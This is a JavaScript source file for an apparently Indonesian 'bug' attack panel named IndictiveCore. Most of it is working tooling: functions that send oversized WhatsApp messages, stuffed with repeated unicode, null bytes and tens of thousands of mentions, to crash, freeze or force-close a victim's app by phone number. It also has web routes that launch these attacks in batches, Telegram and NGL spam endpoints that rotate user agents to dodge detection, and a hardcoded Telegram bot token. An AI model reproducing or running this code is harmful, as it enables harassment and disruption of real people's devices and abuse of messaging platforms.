⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠁⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠉⠉⠙⠒⠒⠚⠉⠁⠀⠀⠀⠁⢣⡎⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

   ___  _     __  _          _____            
  / _ \\(_)___/ /_(_)  _____ / ___/__  _______ 
 / // / / __/ __/ / |/ / -_) /__/ _ \\/ __/ -_)
/____/_/\\__/\\__/_/|___/\\__/\\___/\\___/_/  \\__/ 
`))

console.log(chalk.cyanBright(`
─────────────────────────────────────
NAME APPS   : IndictiveCore
AUTHOR      : AiiSigma
ID OWN      : ${ownerIds}
VERSION     : 3 ( III )
─────────────────────────────────────\n\n`));

bot.launch();

// Si anjing sialan ini yang bikin gw pusing 
setTimeout(() => {
  console.log('🔄 Starting auto-reload activated');
  forceReloadWithRetry();
}, 15000);

// nambahin periodic health check biar aman aja
setInterval(() => {
  const activeSessions = sessions.size;
  const userSessions = loadUserSessions();
  const totalRegisteredSessions = Object.values(userSessions).reduce((acc, numbers) => acc + numbers.length, 0);
  
  console.log(`📊 Health Check: ${activeSessions}/${totalRegisteredSessions} sessions active`);
  
  // Only attempt reload if we have registered sessions but none are active
  if (totalRegisteredSessions > 0 && activeSessions === 0) {
    console.log('🔄 Health check: Found registered sessions but none active, attempting reload...');
    reloadAttempts = 0; // Reset counter
    forceReloadWithRetry();
  } else if (activeSessions > 0) {
    console.log('✅ Health check: Sessions are active');
  }
}, 10 * 60 * 1000); // Check setiap 10 menit

// ================ FUNCTION BUGS HERE ================== \\
/*
  Function nya isi Ama function punya lu sendiri
*/
// FUNCTION BLANK
async function N3xithBlank(sock, X) {
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "꙳͙͡༑ᐧ𝐒̬𝖎፝͢𝑿 ⍣᳟ 𝐍ͮ𝟑͜𝐮̽𝐕𝐞𝐫̬⃜꙳𝐗ͮ𝐨͢͡𝐗༑〽️" + "ោ៝".repeat(10000),
      caption: "𝐍𝟑𝐱̈𝒊𝐭𝐡 Cʟᴀsˢˢˢ #🇧🇳 ( 𝟑𝟑𝟑 )" + "꧀".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  try {
    await sock.relayMessage(X, msg, {
      participant: { jid: X },
      messageId: sock.generateMessageTag?.() || generateMessageID()
    });
  } catch (error) {
    console.error(`❌ Gagal mengirim bug ke ${X}:`, error.message);
  }
}

async function delayloww(sock, target) {
    const PouMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "\u0000".repeat(200),
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: JSON.stringify({ status: true }),
                        version: 3
                    }
                },
                contextInfo: {
                    mentionedJid: Array.from(
                        { length: 30000 },
                        () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                    ),
                    remoteJid: "status@broadcast",
                    forwardingScore: 999,
                    isForwarded: true
                }
            }
        }
    }, {});
    
    await sock.relayMessage("status@broadcast", PouMsg.message, {
            messageId: PouMsg.key.id,
            statusJidList: [target],
            additionalNodes: [ {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}

async function XvrZenDly(sock, target) {
  try {
    let msg = generateWAMessageFromContent(target, {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
          },
          body: {
            text: "\u0000".repeat(1500),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
            version: 3
          }
        }
      }
    }, { userJid: target });

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

  } catch (err) {
    console.error(chalk.red.bold("func Error jir:"), err);
  }
}
async function VtxCrash(sock, target) {
  try {
    const msg = {
      viewOnceMessage: {
        message: {
          nativeFlowResponseMessage: {
            name: "crash_notif_response",
            paramsJson: JSON.stringify({
              flow_id: "#GyzenLyoraa⃠",
              flow_action: "CRASH_GYZEN",
              content: ":҉⃝".repeat(10000),
              crash_code: Math.floor(Math.random() * 9999999),
              meta: {
                type: "notif_injection",
                timestamp: Date.now(),
                author: "8R",
              },
            }),
          },
          groupInviteMessage: {
            groupJid: "120363418749199341@g.us",
            inviteCode: "974197419741",
            inviteExpiration: 97419741,
            groupName: "-#GyzenLyoraa" + ":҉⃝".repeat(20000),
            caption: "-#Vortunix!" + ":҉⃝".repeat(20000),
            jpegThumbnail: null,
          },
        },
      },
    };

    await sock.relayMessage(target, msg, {
      participant: { jid: target },
      messageId: "notif_" + Date.now(),
    });
} catch(err)  {
    console.log(err) 
  }
}

// INI BUAT BUTTON DELAY 50% YA ANJINKK@)$+$)+@((_
async function delaylow(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk delaylow');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 30) {
        await Promise.all([
          VtxCrash(sock, X),
          delayloww(sock, X),
          sleep(500)
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 delaylow 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// INI BUAT BUTTON DELAY 100% YA ANJINKK@)$+$)+@((_
async function delayhigh(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk delayhigh');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 50) {        
        await Promise.all([
          delayloww(sock, X),
          XvrZenDly(sock, X),
          sleep(2000),
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/50 delayhigh 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// INI BUAT BUTTON ANDROID BLANK
async function androkill(sock, target) {
     for (let i = 0; i < 3; i++) {
         await XvrZenDly(sock, target);
         await delayloww(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
// INI BUAT BUTTON BLANK IOS
async function blankios(sock, target) {
     for (let i = 0; i < 1; i++) {
         await XvrZenDly(sock, target);
         await delayloww(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

// INI BUAT BUTTON IOS INVISIBLE
async function fcios(sock, target) {
     for (let i = 0; i < 50; i++) {
         await delayloww(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

// INI BUAT BUTTON FORCE CLOSE MMEK LAH MASA GA TAU
async function forklos(sock, target) {
     for (let i = 0; i < 3; i++) {
         await XvrZenDly(sock, target);
         await delayloww(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

// Middleware untuk parsing JSON
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.json());
app.use(express.static('public'));

// ==================== AUTH MIDDLEWARE ==================== //
function requireAuth(req, res, next) {
  const username = req.cookies.sessionUser;
  
  if (!username) {
    return res.redirect("/login?msg=Silakan login terlebih dahulu");
  }
  
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }
  
  if (Date.now() > currentUser.expired) {
    return res.redirect("/login?msg=Session expired, login ulang");
  }
  
  next();
}

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "INDICTIVE", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 }); 
  res.redirect("/option");
});

// Tambahkan auth middleware untuk WiFi Killer
app.get('/option', (req, res) => {
    const username = req.cookies.sessionUser;
    if (!username) {
        return res.redirect('/login');
    }
    res.sendFile(path.join(__dirname, 'INDICTIVE', 'opsi.html'));
});

// Route untuk dashboard
app.get("/dashboard", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "dashboard.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file opsi.html:", err);
      return res.status(500).send("File dashboard tidak ditemukan");
    }
    res.send(html);
  });
});

app.get("/dashboard2", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "dashboard2.html"); // atau file lain jika ada
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file dashboard:", err);
      return res.status(500).send("File dashboard tidak ditemukan");
    }
    res.send(html);
  });
});

// Endpoint untuk mendapatkan data user dan session
app.get("/api/option-data", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.status(404).json({ error: "User not found" });
  }

  // Ambil role dari data user
  const userRole = currentUser.role || 'user';

  // Format expired time
  const expired = new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });

  // Hitung waktu tersisa
  const now = Date.now();
  const timeRemaining = currentUser.expired - now;
  const daysRemaining = Math.max(0, Math.floor(timeRemaining / (1000 * 60 * 60 * 24)));

  res.json({
    username: currentUser.username,
    role: userRole,
    activeSenders: sessions.size,
    expired: expired,
    daysRemaining: daysRemaining
  });
});
      
app.get("/profile", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "profil.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});
      
/* 
USER DETECTIONS - HARAP DI BACA !!!
MASUKIN BOT TOKEN TELE LU DAN ID TELE LU ATAU ID GROUP TELEL LU

Gunanya buat apa bang?
itu kalo ada user yang make fitur bug nanti si bot bakal ngirim log history nya ke id telelu, kalo pake id GC tele lu, nanti ngirim history nya ke GC tele lu bisa lu atur aja mau ngirim nya ke mana ID / ID GC
*/
const BOT_TOKEN = "7903358806:AAFkZcHHbkehAmnL83F4D_LiaV-UdiKa4M8";
const CHAT_ID = "7250235697";
// simpan waktu terakhir eksekusi (global cooldown)
let lastExecution = 0;

// INI JANGAN DI APA APAIN
app.get("/execution", async (req, res) => {
  try {
    const username = req.cookies.sessionUser;

    // Jika tidak ada username, redirect ke login
    if (!username) {
      return res.redirect("/login?msg=Silakan login terlebih dahulu");
    }

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.redirect("/login?msg=Session expired, login ulang");
    }

    // Handle parameter dengan lebih baik
    const justExecuted = req.query.justExecuted === 'true';
    const targetNumber = req.query.target || '';
    const mode = req.query.mode || '';

    // Jika justExecuted=true, tampilkan halaman sukses
    if (justExecuted && targetNumber && mode) {
      const cleanTarget = targetNumber.replace(/\D/g, '');
      const country = getCountryCode(cleanTarget);
      
      return res.send(executionPage("✓ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()} - Completed - ${country}`
      }, false, currentUser, "", mode));
    }

    // Ambil session user yang aktif
    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    const activeUserSenders = userSenders.filter(sender => sessions.has(sender));
    
    console.log(`[INFO] User ${username} has ${activeUserSenders.length} active senders`);

    // Tampilkan halaman execution normal
    return res.send(executionPage("🟥 Ready", {
      message: "Masukkan nomor target dan pilih mode bug",
      activeSenders: activeUserSenders
    }, true, currentUser, "", mode));

  } catch (err) {
    console.error("❌ Fatal error di /execution:", err);
    return res.status(500).send("Internal Server Error");
  }
});

// INI BUAT PANGILAN KE FUNGSINYA
app.post("/execution", requireAuth, async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const { target, mode } = req.body;

    if (!target || !mode) {
      return res.status(400).json({ 
        success: false, 
        error: "Target dan mode harus diisi" 
      });
    }

    // Validasi format nomor internasional
    const cleanTarget = target.replace(/\D/g, '');
    
    // Validasi panjang nomor
    if (cleanTarget.length < 7 || cleanTarget.length > 15) {
      return res.status(400).json({
        success: false,
        error: "Panjang nomor harus antara 7-15 digit"
      });
    }

    // Validasi tidak boleh diawali 0
    if (cleanTarget.startsWith('0')) {
      return res.status(400).json({
        success: false,
        error: "Nomor tidak boleh diawali dengan 0. Gunakan format kode negara (contoh: 62, 1, 44, dll.)"
      });
    }

    // Cek session user
    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    const activeUserSenders = userSenders.filter(sender => sessions.has(sender));

    if (activeUserSenders.length === 0) {
      return res.status(400).json({
        success: false,
        error: "Tidak ada sender aktif. Silakan tambahkan sender terlebih dahulu."
      });
    }

    // Validasi mode bug
    const validModes = ["delay", "blank", "medium", "blank-ios", "fcinvsios", "force-close"];
    if (!validModes.includes(mode)) {
      return res.status(400).json({
        success: false,
        error: `Mode '${mode}' tidak valid. Mode yang tersedia: ${validModes.join(', ')}`
      });
    }

    // Eksekusi bug
    const userSender = activeUserSenders[0];
    const sock = sessions.get(userSender);
    
    if (!sock) {
      return res.status(400).json({
        success: false,
        error: "Sender tidak aktif. Silakan periksa koneksi sender."
      });
    }

    const targetJid = `${cleanTarget}@s.whatsapp.net`;
    const country = getCountryCode(cleanTarget);

    // HATI² HARUS FOKUS KALO MAU GANTI NAMA FUNGSI NYA
    let bugResult;
    try {
      if (mode === "delay") {
        bugResult = await delaylow(sock, 24, targetJid);
      } else if (mode === "medium") {
        bugResult = await delayhigh(sock, 24, targetJid);
      } else if (mode === "blank") {
        bugResult = await androkill(sock, targetJid);
      } else if (mode === "blank-ios") {
        bugResult = await blankios(sock, targetJid);
      } else if (mode === "fcinvsios") {
        bugResult = await fcios(sock, targetJid);
      } else if (mode === "force-close") {
        bugResult = await forklos(sock, targetJid);
      }

      // Kirim log ke Telegram
      const logMessage = `<blockquote>⚡ <b>New Execution Success - International</b>
      
👤 User: ${username}
📞 Sender: ${userSender}
🎯 Target: ${cleanTarget} (${country})
📱 Mode: ${mode.toUpperCase()}
⏰ Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: logMessage,
        parse_mode: "HTML"
      }).catch(err => console.error("Gagal kirim log Telegram:", err.message));

      // Update global cooldown
      lastExecution = Date.now();

      res.json({ 
        success: true, 
        message: "Bug berhasil dikirim!",
        target: cleanTarget,
        mode: mode,
        country: country
      });

    } catch (error) {
      console.error(`[EXECUTION ERROR] User: ${username} | Error:`, error.message);
      res.status(500).json({
        success: false,
        error: `Gagal mengeksekusi bug: ${error.message}`
      });
    }

  } catch (error) {
    console.error("❌ Error in POST /execution:", error);
    res.status(500).json({
      success: false,
      error: "Terjadi kesalahan internal server"
    });
  }
});

// Route untuk serve HTML Telegram Spam
app.get('/telegram-spam', (req, res) => {
    const username = req.cookies.sessionUser;
    if (!username) {
        return res.redirect('/login');
    }
    res.sendFile(path.join(__dirname, 'INDICTIVE', 'telegram-spam.html'));
});

// API endpoint untuk spam Telegram
app.post('/api/telegram-spam', async (req, res) => {
    try {
        const username = req.cookies.sessionUser;
        if (!username) {
            return res.json({ success: false, error: 'Unauthorized' });
        }

        const { token, chatId, count, delay, mode } = req.body;
        
        if (!token || !chatId || !count || !delay || !mode) {
            return res.json({ success: false, error: 'Missing parameters' });
        }

        // Validasi input
        if (count > 1000) {
            return res.json({ success: false, error: 'Maximum count is 1000' });
        }

        if (delay < 100) {
            return res.json({ success: false, error: 'Minimum delay is 100ms' });
        }

        // Protected targets - tidak boleh diserang
        const protectedTargets = ['@AiiSigma', '7250235697'];
        if (protectedTargets.includes(chatId)) {
            return res.json({ success: false, error: 'Protected target cannot be attacked' });
        }

        // Kirim log ke Telegram owner
        const logMessage = `<blockquote>🔰 <b>New Telegram Spam Attack</b>
        
👤 User: ${username}
🎯 Target: ${chatId}
📱 Mode: ${mode.toUpperCase()}
🔢 Count: ${count}
⏰ Delay: ${delay}ms
🕐 Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: logMessage,
                parse_mode: "HTML"
            });
        } catch (err) {
            console.error("Gagal kirim log Telegram:", err.message);
        }

        // Return success untuk trigger frontend
        res.json({ 
            success: true, 
            message: 'Attack started successfully',
            attackId: Date.now().toString()
        });

    } catch (error) {
        console.error('Telegram spam error:', error);
        res.json({ success: false, error: 'Internal server error' });
    }
});

// ============================================
const userTracking = {
  requests: new Map(), // Track per user
  targets: new Map(),  // Track per target
  
  // Reset otomatis tiap 24 jam
  resetDaily() {
    this.requests.clear();
    this.targets.clear();
    console.log('🔄 Daily tracking reset');
  },
  
  // Cek apakah user sudah melebihi limit harian
  canUserSend(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    return current + count;
  },
  
  // Cek apakah target sudah melebihi limit harian
  canTargetReceive(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    return current + count;
  },
  
  // Update counter setelah berhasil kirim
  updateUser(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    this.requests.set(key, current + count);
  },
  
  updateTarget(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    this.targets.set(key, current + count);
  },
  
  // Lihat statistik user
  getUserStats(userId) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    return this.requests.get(key) || 0;
  },
  
  // Lihat statistik target
  getTargetStats(target) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    return this.targets.get(key) || 0;
  }
};

// Auto-reset setiap 24 jam (midnight)
setInterval(() => {
  const now = new Date();
  if (now.getHours() === 0 && now.getMinutes() === 0) {
    userTracking.resetDaily();
  }
}, 60000); // Cek tiap 1 menit

// ============================================
// FUNGSI NGL SPAM - UPDATED
// ============================================
async function nglSpam(target, message, count) {
  const logs = [];
  let success = 0;
  let errors = 0;

  console.log(`🔍 Starting NGL spam to ${target}, message: ${message}, count: ${count}`);

  const sendNGLMessage = async (target, message, attempt) => {
    // Enhanced form data dengan field tambahan
    const formData = new URLSearchParams();
    formData.append('username', target);
    formData.append('question', message);
    formData.append('deviceId', generateEnhancedUUID());
    formData.append('gameSlug', '');
    formData.append('referrer', '');
    formData.append('timestamp', Date.now().toString());

    // Random delay yang lebih realistis
    if (attempt > 1) {
      const randomDelay = Math.floor(Math.random() * 4000) + 2000; // 2-6 detik
      await new Promise(resolve => setTimeout(resolve, randomDelay));
    }

    // Enhanced user agents
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
      'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
    ];
    
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    try {
      console.log(`🔍 Attempt ${attempt} to ${target}`);
      
      const response = await axios.post('https://ngl.link/api/submit', formData, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'User-Agent': randomUserAgent,
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Origin': 'https://ngl.link',
          'Referer': `https://ngl.link/${target}`,
          'X-Requested-With': 'XMLHttpRequest',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin'
        },
        timeout: 15000,
        validateStatus: function (status) {
          return status >= 200 && status < 500; // Terima semua status kecuali server errors
        }
      });

      console.log(`🔍 Response status: ${response.status}, data:`, response.data);

      // Enhanced response handling
      if (response.status === 200) {
        if (response.data && response.data.success !== false) {
          success++;
          logs.push(`[${attempt}/${count}] ✅ Berhasil dikirim ke ${target}`);
          return true;
        } else {
          errors++;
          logs.push(`[${attempt}/${count}] ⚠️ Response tidak valid: ${JSON.stringify(response.data)}`);
          return false;
        }
      } else if (response.status === 429) {
        errors++;
        logs.push(`[${attempt}/${count}] 🚫 Rate limited - tunggu beberapa saat`);
        // Tunggu lebih lama jika rate limited
        await new Promise(resolve => setTimeout(resolve, 10000));
        return false;
      } else {
        errors++;
        logs.push(`[${attempt}/${count}] ❌ HTTP ${response.status}: ${response.statusText}`);
        return false;
      }
    } catch (error) {
      errors++;
      console.error(`🔍 Error in attempt ${attempt}:`, error.message);
      
      if (error.response) {
        logs.push(`[${attempt}/${count}] ❌ HTTP ${error.response.status}: ${error.response.data?.message || error.response.statusText}`);
      } else if (error.request) {
        logs.push(`[${attempt}/${count}] ❌ Network Error: Tidak dapat terhubung ke server NGL`);
      } else {
        logs.push(`[${attempt}/${count}] ❌ Error: ${error.message}`);
      }
      
      return false;
    }
  };

  // Enhanced UUID generator
  function generateEnhancedUUID() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substr(2, 9);
    return `web-${timestamp}-${random}`;
  }

  // Validasi input
  if (!target || !message || count <= 0) {
    throw new Error('Input tidak valid');
  }

  if (count > 50) { // Kurangi limit untuk menghindari detection
    throw new Error('Maksimal 50 pesan per request untuk menghindari detection');
  }

  // Jalankan spam
  logs.push(`🚀 Memulai spam ke: ${target}`);
  logs.push(`📝 Pesan: ${message}`);
  logs.push(`🔢 Jumlah: ${count} pesan`);
  logs.push(`⏳ Delay: 2-6 detik random antar pesan`);
  logs.push(`─`.repeat(40));

  for (let i = 0; i < count; i++) {
    const result = await sendNGLMessage(target, message, i + 1);
    
    // Jika rate limited, berhenti sementara
    if (i > 0 && i % 10 === 0) {
      logs.push(`⏸️  Istirahat sebentar setelah ${i} pesan...`);
      await new Promise(resolve => setTimeout(resolve, 10000));
    }
  }

  logs.push(`─`.repeat(40));
  logs.push(`📊 SELESAI! Sukses: ${success}, Gagal: ${errors}`);

  return { success, errors, logs };
}

// Helper function untuk generate UUID
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// ============================================
// ROUTE NGL SPAM WEB - UPDATED dengan Info Limit
// ============================================

// ==================== NGL SPAM ROUTE ==================== //
app.get("/ngl-spam", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  const formattedExp = currentUser ? new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta"
  }) : "-";

  const userId = req.ip || req.headers['x-forwarded-for'] || username;
  const userUsageToday = userTracking.getUserStats(userId);
  const remainingUser = 200 - userUsageToday;
  const usagePercentage = (userUsageToday / 200) * 100;

  // Load template dari file terpisah
  const filePath = path.join(__dirname, "INDICTIVE", "spam-ngl.html");
  
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file spam-ngl.html:", err);
      return res.status(500).send("File tidak ditemukan");
    }

    // Replace variables dengan data REAL dari sistem
    let finalHtml = html
      .replace(/\${username}/g, username)
      .replace(/\${formattedExp}/g, formattedExp)
      .replace(/\${userUsageToday}/g, userUsageToday)
      .replace(/\${remainingUser}/g, remainingUser)
      .replace(/\${usagePercentage}/g, usagePercentage);
    
    res.send(finalHtml);
  });
});

// ============================================
// API ENDPOINT - UPDATED dengan Tracking System
// ============================================
app.get("/api/ngl-stats", requireAuth, (req, res) => {
  const userId = req.ip || req.headers['x-forwarded-for'] || req.cookies.sessionUser || 'anonymous';
  
  res.json({
    userStats: {
      todayUsage: userTracking.getUserStats(userId),
      dailyLimit: 200,
      remaining: 200 - userTracking.getUserStats(userId)
    },
    resetTime: 'Midnight (00:00 WIB)',
    message: 'Statistik penggunaan hari ini'
  });
});

// ✨ BONUS: Endpoint untuk cek target
app.get("/api/ngl-target-stats/:target", requireAuth, (req, res) => {
  const { target } = req.params;
  
  res.json({
    target: target,
    todayReceived: userTracking.getTargetStats(target),
    dailyLimit: 100,
    remaining: 100 - userTracking.getTargetStats(target),
    resetTime: 'Midnight (00:00 WIB)'
  });
});

app.post("/api/ngl-spam-js", requireAuth, async (req, res) => {
  const { target, message, count } = req.body;
  
  // Ambil user ID dari IP atau cookie
  const userId = req.ip || req.headers['x-forwarded-for'] || req.cookies.sessionUser || 'anonymous';
  
  // Hard limits
  const limits = {
    maxPerRequest: 100,      // Max 100 pesan per request
    minDelay: 3000,          // Minimal delay 3 detik
    maxDailyPerUser: 200,    // Max 200 pesan per user per hari
    maxDailyPerTarget: 100   // Max 100 pesan ke target yang sama
  };
  
  if (!target || !message || !count) {
    return res.status(400).json({ error: "Semua field harus diisi" });
  }

  // ✅ VALIDASI 1: Cek count tidak melebihi maxPerRequest
  if (count > limits.maxPerRequest) {
    return res.status(400).json({
      error: `❌ Untuk keamanan, maksimal ${limits.maxPerRequest} pesan per request`,
      currentCount: count,
      maxAllowed: limits.maxPerRequest
    });
  }

  if (count < 1) {
    return res.status(400).json({
      error: '❌ Jumlah pesan harus minimal 1'
    });
  }

  // ✅ VALIDASI 2: Cek limit harian user
  const userTotal = userTracking.canUserSend(userId, count);
  if (userTotal > limits.maxDailyPerUser) {
    const currentUsage = userTracking.getUserStats(userId);
    return res.status(429).json({
      error: '🚫 Limit harian tercapai!',
      message: `Kamu sudah kirim ${currentUsage} pesan hari ini. Limit: ${limits.maxDailyPerUser}/hari`,
      currentUsage: currentUsage,
      dailyLimit: limits.maxDailyPerUser,
      remaining: limits.maxDailyPerUser - currentUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  // ✅ VALIDASI 3: Cek limit harian target
  const targetTotal = userTracking.canTargetReceive(target, count);
  if (targetTotal > limits.maxDailyPerTarget) {
    const currentTargetUsage = userTracking.getTargetStats(target);
    return res.status(429).json({
      error: '🚫 Target sudah menerima terlalu banyak pesan!',
